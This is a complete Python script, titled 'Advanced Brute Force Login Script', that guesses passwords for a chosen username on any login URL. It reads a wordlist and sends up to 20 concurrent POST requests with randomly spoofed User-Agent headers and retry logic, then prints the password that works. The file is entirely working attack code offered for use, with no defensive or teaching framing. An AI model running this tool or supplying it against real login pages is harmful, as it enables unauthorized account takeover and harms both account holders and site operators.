import requests
import argparse
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from fake_useragent import UserAgent

# Function to attempt login with a given username and password
def try_login(url, username, password, session):
    payload = {
        'username': username,
        'password': password
    }
    
    # Custom headers (User-Agent spoofing)
    headers = {
        'User-Agent': UserAgent().random
    }

    try:
        # Perform the login POST request (this assumes the login form uses these parameter names)
        response = session.post(url, data=payload, headers=headers, timeout=10)

        # Check for successful login based on response (modify based on the target page behavior)
        if "Login successful" in response.text:  # Customize this based on the actual response
            print(f"Success! Found password: {password}")
            return True
        elif "incorrect" in response.text:  # Customize this based on actual response
            print(f"Failed attempt with password: {password}")
        else:
            print("Unexpected response, check the form structure")
    
    except requests.RequestException as e:
        print(f"Error making request: {e}")
    
    return False

# Function to read the password list file
def load_password_list(file_path):
    with open(file_path, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords

# Retry logic for requests (to handle rate limiting, timeouts, etc.)
def create_session():
    session = requests.Session()
    
    # Retry logic
    retry = Retry(
        total=3,
        backoff_factor=0.5,  # exponential backoff
        status_forcelist=[500, 502, 503, 504],
        method_whitelist=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

# Main function to handle the brute force process
def brute_force(url, username, password_file):
    passwords = load_password_list(password_file)
    
    # Create a session with retry logic and custom headers
    session = create_session()
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for password in passwords:
            # Submit password attempts concurrently
            futures.append(executor.submit(try_login, url, username, password, session))
        
        # Wait for all threads to finish
        for future in futures:
            future.result()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Brute Force Login Script")
    parser.add_argument("url", help="The URL of the login page")
    parser.add_argument("username", help="The username to brute force with")
    parser.add_argument("-P", "--passwordfile", help="The path to the password list file", required=True)
    
    args = parser.parse_args()
    
    brute_force(args.url, args.username, args.passwordfile)
